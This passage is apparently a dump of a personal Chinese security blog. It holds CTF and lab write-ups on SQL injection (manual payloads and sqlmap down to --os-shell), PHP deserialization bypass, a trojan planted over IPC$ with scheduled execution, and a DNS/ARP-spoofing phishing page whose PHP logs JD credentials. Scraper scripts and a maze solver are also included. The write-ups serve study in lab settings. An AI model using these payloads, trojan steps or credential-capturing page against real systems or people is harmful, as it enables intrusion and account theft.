http://123.206.87.240:9004/1ndex.php?id=-1&apos; ununionion seselectlect 1,group_concat(address) from flag1 --+获取address中的内容 ./Once_More.php下一关地址得到另外一个地址 http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&apos;~&apos;),3) %23给出提示XPATH syntax error: ‘class,flag2‘ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(column_name) from information_schema.columns where table_name=flag2),&apos;~&apos;),3) %23Unknown column ‘flag2’ in ‘where clause’ http://123.206.87.240:9004/Once_More.php?id=1&apos; and updatexml(1,concat(&apos;~&apos;,(select group_concat(flag2) from flag2),&apos;~&apos;),3) %23XPATH syntax error: ‘flag{Bugku-sql_6s-2i-4t-bug}‘ ！！！注意把flag改为小写字母 宽字节注入靶场：http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1 一、手工注入第一步 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27加单引号报错 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,table_name from information_schema.tables where table_schema=database()%23查看所有的表 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()%23查看表中的列 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x637466 %23 ctf,ctf2,ctf3,ctf4,gbksqli,news0x637466 为十六进制ctf 获取字段内容 http://chinalover.sinaapp.com/SQL-GBK/index.php?id=-1%aa&apos; union select 1,group_concat(pw) from ctf %23flag:nctf{h4cked_By_w00dPeck3r} 二、sqlmap注入检测是否有注入点 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27没有成功使用十六进制 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex获取数据库名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --dbs //选择十六进制 获取数据库名 单引号使用url编码获取表名 sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex --D sae-chinalover --tables获取flag sqlmap.py -u http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%aa%27 --hex -D sae-chinalover -T ctf --dump","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"木马","date":"2020-07-18T12:34:10.000Z","path":"2020/07/18/木马/","text":"初识木马 实验目的使用灰鸽子软件以及端口爆破软件控制目的主机 准备一台xp，一台2003其中xp地址为10.1.1.3/24 2003为10.1.1.1/24使两个主机能够通信xp作为攻击方，2003为受害者 1.制作木马使用灰鸽子制作木马，将木马生成在在桌面（记住路径之后要使用） 2.扫描主机，并对账号密码进行爆破ip起始地址为10.1.1.1-10.1.1.255密码配置文件其实只要扫描10.1.1.1即可（因为是实验） 获取账号密码username：administratorpassword: “” 3.与目标主机建立IPC$net use \\\\10.1.1.1\\ipc$ &quot;&quot; \\user:administrator 4.植入木马到目标主机copy C:\\Documents and Settings\\shimisi\\桌面\\qq.exe \\\\10.1.1.1\\ipc$ 5.设置目标主机运行木马net time \\\\10.1.1.1根据目标主机时间设置事物的开始时间at \\\\10.1.1.1 17:17 c:\\qq.exe在上面的时间之后三分钟左右设置一个事物即在17：17时运行木马文件 6.成功控制目标主机观察目标主机已自动上线，已可以进行监控或传输数据等操作 获取屏幕内容 控制命令行","tags":[]},{"title":"jdtest","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/jdtest/","text":"爬取京东商品图片的小测试 访问的页面图片链接的位置 # -*- coding = utf - 8 -*- #@Time : 2020/7/16 14:54 #@Author : sunzy #@File : jd.py import re import requests import time import os dir = &quot;jdtp&quot; if not os.path.exists(dir): os.mkdir(dir) baseurl = &quot;https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu&quot; head = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot; &#125; response = requests.get(url=baseurl, headers = head) #print(response.text) html = response.text findlinks = &#x27;&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;\\d&quot; src=&quot;(.*?)&quot;.*?&gt;&#x27; #&lt;img width=&quot;220&quot; height=&quot;220&quot; data-img=&quot;1&quot; src=&quot;//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg&quot; data-lazy-img=&quot;done&quot; source-data-lazy-img=&quot;&quot;&gt; urls = re.findall(findlinks, html) for url in urls: time.sleep(1) file_name = url.split(&#x27;/&#x27;)[-1] res = requests.get(&quot;http:&quot;+url,headers = head) with open(dir+&#x27;/&#x27;+file_name, &quot;wb&quot;) as f: f.write(res.content)","tags":[{"name":"python","slug":"python","permalink":"https://sunzhengyu99.github.io/tags/python/"}]},{"title":"sqlmap","date":"2020-07-18T09:42:34.000Z","path":"2020/07/18/sql注入/","text":"sqlmap使用 第一步: -u &quot;xx” --cookie= &quot;yyy&quot; //带上cookie对URL进行注入探测第二步: -u &quot;xxx” --cookie= &quot;yy&quot; - current--db //对数据库名进行获取第三步: -u &quot;xxx&quot; --cookie=&quot;yyy&quot; -D dvwa --tables //对数据库dvwa的表名进行枚举第四步: -u &quot;xx&quot; --cookie= &quot;yyy&quot; -D dvwa -T users --columns //对dvwa库里面的名为users表的列名进行枚举第五步: -u&quot;xxx&quot;--cookie=&quot;yyy&quot; -D dvwa -T users -C name,password - dump //探测user表name和password字段如果此时得到的密码为密文, SQLmap会自动询问，是否爆破,选择”是”即可开始使用SQLMAP自带的字典进行爆破。 第六步: -u&quot;xxx&quot;--cookie= &quot;yy&quot; --os - shell //获取shell,选择后台语言sql注入order by * group by * 利用内置函数暴数据库信息 version() 查看数据库版本 database() 查看当前数据库名 user() 查看当前用户 查看表： Select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() 可十六进制查看字段： select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=‘biaoming’;","tags":[{"name":"sql","slug":"sql","permalink":"https://sunzhengyu99.github.io/tags/sql/"}]},{"title":"爬图","date":"2020-07-18T09:40:51.000Z","path":"2020/07/18/爬图/","text":"用爬虫爬取小姐姐的图片 用的库 re #正则表达式 requests #url请求 time #时间 os #用于创建文件夹，保存图片 ##准备工作1.首先访问该链接https://www.vmgirls.com/2.随便点击一个进入查看详情https://www.vmgirls.com/13344.html3.F12审查元素网查看页详情，主要查看图片链接的标签位置，写出正则表达式该正则表达式为findlinks = &#39;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#39; 完整程序# -*- coding = utf - 8 -*- #@Time : 2020/7/16 13:36 #@Author : sunzy #@File : tupian.py import re import requests import time import os dir = &quot;plmm&quot; #文件夹名字 if not os.path.exists(dir): #首先判断是否存在当前文件夹如果没有则创建一个 os.mkdir(dir) # 模仿浏览器的首部信息，绕过一些网站的反爬取措施 head = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61&quot; &#125; url = &quot;https://www.vmgirls.com/13344.html&quot; response = requests.get(url, headers = head) # 访问目标网页，获取网页内容 html = response.text findlinks = &#x27;&lt;a href=&quot;(.*?)&quot; alt=&quot;.*?&quot; title=&quot;.*?&quot;&gt;&#x27; urls = re.findall(findlinks, html) #爬取到的图片链接保存在urls中， 是一个列表 for url in urls: time.sleep(1) #防止访问速度过快使服务器崩溃 file_name = url.split(&#x27;/&#x27;)[-1] #保存图片的名字 res = requests.get(url, headers = head) #依此访问图片链接 with open(dir+&#x27;/&#x27;+file_name, &quot;wb&quot;) as f: #以二进制形式保存图片 f.write(res.content)","tags":[{"name":"爬虫","slug":"爬虫","permalink":"https://sunzhengyu99.github.io/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"diaoyu","date":"2020-07-18T09:37:15.000Z","path":"2020/07/18/diaoyu/","text":"DNS欺骗、ARP攻击及钓鱼网站制作 1.实验目的获取登录jd网页的用户名和密码2.实验主机一台kali,两台win2003,其中一台为客户机，一台为服务器，kali作为攻击者3.实验材料京东登录网页及其所有图片（浏览器访问https://passport.jd.com/new/login.aspx?ReturnUrl=https%3A%2F%2Fwww.jd.com%2F 之后保存网页即可）修改index.html中的内容error.php中的内容如下关键代码（用于保存用户名和密码以及迷惑用户） &lt;?php $nam = stripslashes($_POST[&#x27;name&#x27;]); //name 是由网页的表单信息决定，不同的网页对应不同的内容，这一点很重要 $pas = stripslashes($_POST[&#x27;pass&#x27;]);//pass也一样 $content = &quot;您已捕获京东账号及密码1个：&quot; . &quot; 用户名 &quot; . $nam . &quot; 密码 &quot; . $pas; //保存捕获的用户名和密码 $filed = @fopen(&quot;1.txt&quot;, &quot;a+&quot;); //打开1.txt @fwrite($filed, &quot;$content\\n&quot;); //将用户名和密码写入1.txt ?&gt; &lt;html&gt; &lt;head&gt; &lt;script type=&quot;text/javascript&quot;&gt; function goBack() &#123; window.history.back() //后退+刷新 &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload=&quot;goBack()&quot;&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt; &lt;/body&gt; &lt;/html&gt; 4.实验拓扑图 实验步骤一.部署京东的服务器1.安装DNS和web服务器（具体步骤略）2.配置DNS服务器a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）b.在jd域中新建一台主机 www.jd.com ip:10.1.1.1 2.IISa.将默认网站停止b.新建网站jd.com,文件路径为保存的jd网页c.打开web服务中的asp（因为此网站不是静态网站）（使用2003客户机访问www.jd.com看看网站发布是否成功） 二.部署kali1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。2.开启apache服务，并检查80端口是否已开启systemctl start apache2netstat -antpl3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，添加一条 PTR 记录，使用户访问www.jd.com，指向为10.1.1.2 选中一行后，按两次d可删除内容想要编辑时，先按i(insert)编辑结束后 :wq 保存4.打开ettercap软件5.选择sniff–unified sniffing，并选择监听eth06.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机7.添加欺骗记录选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 28.在Mitm选择ARP欺骗在弹出的窗口中，勾选第一个点击确定9.选择plugins – Manage the plugins，准备进行DNS欺骗在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗 三.用户访问登录页面1.在客户机中在中，再次登录www.jd.com输入用户名密码然后点击登录 2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)","tags":[{"name":"DNS","slug":"DNS","permalink":"https://sunzhengyu99.github.io/tags/DNS/"}]},{"title":"guestbook","date":"2020-04-18T09:42:34.000Z","path":"2020/04/18/Guestbook/","text":"guestbook 题目提示：This guestbook sucks. sqlmap is your friend. 是sql注入点击Message List 时是空的， 点击post是可以提交新信息，点击查看新信息 在id值后加上” ‘ “测试是否存在测试点网页报错说明存在注入点union 注入!查看列 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,3,4%20# //id=-1 是让前面的内容不显示 3被回显 1.查看数据库名 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1%20union%20select%201,2,database(),4%20# 数据库的名字g8 2.查看表名 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select table_name from information_schema.tables where table_schema=database() limit 0,1),4# 发现有一个表 flag 3.测试表的字段 https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select column_name from information_schema.columns where table_name=&#x27;flag&#x27; limit 1,1),4# 仍然显示flag 4.读取flag https://hackme.inndy.tw/gb/?mod=read&amp;id=-1 union select 1,2,(select flag from flag limit 1,1),4# 得到flag!","tags":[{"name":"sql注入","slug":"sql注入","permalink":"https://sunzhengyu99.github.io/tags/sql%E6%B3%A8%E5%85%A5/"}]},{"title":"反序列化","date":"2020-03-28T09:42:34.000Z","path":"2020/03/28/php反序列化/","text":"反序列化 PHP魔术方法_ wakeup()是在反序列化操作中起作用的魔法函数， 当unserialize的时候， 会检查时候存在 __ wakeup()函数, 如果存在的话，会优先调用__wakeup()函数。 而wakeup()函数漏洞就是与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用wakeup()函数, 如果该数字大于真实属性个数，就会绕过__wakeup()函数。 serialize()函数：用于序列化对象或数组，并返回一个字符串。序列化对象后， 可以很方便的将它传递给其他需要它的地方，且其类型和结构不会改变。 unserialize()函数：用于将通过serialize()函数序列化后的对象或数组进行反序列化，并返回原始的对象结构。 举例说明 &lt;?php class Student&#123; public $full_name = &apos;zhangsan&apos;; public $score = 150; public $grades = array(); function __wakeup() &#123; echo &quot;__wakeup is invoked&quot;; &#125; &#125; $s = new Student(); var_dump(serialize($s)); ?&gt; O:7:&quot;Student&quot;:3:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;各个符号的含义变量类型：类名长度（字节）：类名：属性数量：{属性名类型：属性名长度：属性名：属性值类型：属性值长度：属性值内容} 其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。 当我们将上述的序列化的字符串中的对象属性个数修改为5，变为O:7:”Student”:5:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}} 最后执行运行的代码如下: &lt;?php class Student&#123; public $full_name = &#x27;zhangsan&#x27;; public $score = 150; public $grades = array(); function __wakeup() &#123; echo &quot;__wakeup is invoked&quot;; &#125; function __destruct() &#123; var_dump($this); &#125; &#125; $s = new Student(); $stu = unserialize(&#x27;O:7:&quot;Student&quot;:5:&#123;s:9:&quot;full_name&quot;;s:8:&quot;zhangsan&quot;;s:5:&quot;score&quot;;i:150;s:6:&quot;grades&quot;;a:0:&#123;&#125;&#125;&#x27;); ?&gt; 举例说明题目 class xctf&#123; public $flag = &#x27;111&#x27;; public function __wakeup()&#123; exit(&#x27;bad requests&#x27;); &#125; ?code= &lt;?php class xctf&#123; //定义一个名为xctf的类 public $flag = &#x27;111&#x27;;//定义一个公有的类属性$flag，值为111 public function __wakeup()&#123; //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本 exit(&#x27;bad requests&#x27;); &#125; &#125; $test = new xctf(); //使用new运算符来实例化该类（xctf）的对象为test echo(serialize($test)); //输出被序列化的对象（test） ?&gt; 输出结果 O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;我们要反序列化xctf类的同时还要绕过wakeup方法的执行（如果不绕过wakeup()方法，那么将会输出bad requests并退出脚本），wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。因此，需要修改序列化字符串中的属性个数：当我们将上述的序列化的字符串中的对象属性个数由真实值1修改为2，即如下所示： O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;访问url?code=O:4:”xctf”:2:{s:4:”flag”;s:3:”111”;}","tags":[{"name":"unserialize","slug":"unserialize","permalink":"https://sunzhengyu99.github.io/tags/unserialize/"}]},{"title":"迷宫问题","date":"2020-03-20T10:07:12.000Z","path":"2020/03/20/迷宫问题/","text":"迷宫问题 原题题目描述 小明置身于一个迷宫，请你帮小明找出从起点到终点的最短路程。 小明只能向上下左右四个方向移动。 输入 输入包含多组测试数据。输入的第一行是一个整数T，表示有T组测试数据。 每组输入的第一行是两个整数N和M（1&lt;=N,M&lt;=100）。 接下来N行，每行输入M个字符，每个字符表示迷宫中的一个小方格。 字符的含义如下：‘S’：起点‘E’：终点‘-’：空地，可以通过‘#’：障碍，无法通过 输入数据保证有且仅有一个起点和终点。 输出 对于每组输入，输出从起点到终点的最短路程，如果不存在从起点到终点的路，则输出-1。 样例输入1 5 5 s-### ----- ##--- E#--- ---##样例输出9解决代码#include&lt;iostream&gt; #include&lt;cstring&gt; #include&lt;string&gt; #include&lt;queue&gt; #include &lt;algorithm&gt; using namespace std; int de[100][100];//计步数组 记录走到这个位置所需的步数 不能走到的位置标记为-1 char map[100][100]; //用于存放迷宫地图 typedef pair&lt;int,intP; //坐标 int to[2][4]=&#123;1,-1,0,0,0,0,1,-1&#125;; //在当前坐标下能走的四个方向 int sx,ex,sy,ey; //(sx,sy)为起点坐标 （ex,ey）为终点坐标 int x,y,nx,ny; //(x,y)为函数中当前位置坐标 （nx,ny)为接下来能到达的坐标 int r,l; //r为行数 l为列数 int bfs() &#123; memset(de,-1,sizeof(de)); queue&lt;Pqu; qu.push(P(sx,sy)); //将起点坐标放入队头 de[sx][sy]=0; while(!qu.empty()) &#123; P p=qu.front(); //取出队头坐标 qu.pop() ;//删除对头及走过的坐标 x=p.first,y=p.second; if(x==ex&amp;&amp;y==ey) break; //到达终点 跳出循环 for(int i=0;i&lt;4;i++) &#123; nx=x+to[0][i];//开始向四个方向移动 ny=y+to[1][i]; if(nx&gt;=0&amp;&amp;nx&lt;r&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;l&amp;&amp;map[nx][ny]!=&#x27;#&#x27;&amp;&amp;de[nx][ny]==-1) //判断是否越界 以及是否能走 排除走过的路 &#123; qu.push(P(nx,ny)); //将能走的坐标放入队列 之后依次删除 de[nx][ny]=de[x][y]+1; //步数加一 &#125; &#125; &#125; if(de[ex][ey]==-1) return -1; //终点的记步数组为-1 及不能到达终点 else return de[ex][ey]; &#125; int main() &#123; int n,i,j; while(cin&gt;&gt;n)&#123; while(n--)&#123; cin&gt;&gt;r&gt;&gt;l; for(i=0;i&lt;r;i++)&#123; for(j=0;j&lt;l;j++)&#123; cin&gt;&gt;map[i][j]; if(map[i][j]==&#x27;S&#x27;) //记录起点坐标 &#123; sx=i,sy=j; &#125; else if(map[i][j]==&#x27;E&#x27;) //记录终点坐标 &#123; ex=i,ey=j; &#125; &#125; &#125; cout&lt;&lt;bfs()&lt;&lt;endl; &#125; &#125; return 0; &#125;","tags":[{"name":"bfs","slug":"bfs","permalink":"https://sunzhengyu99.github.io/tags/bfs/"}]}]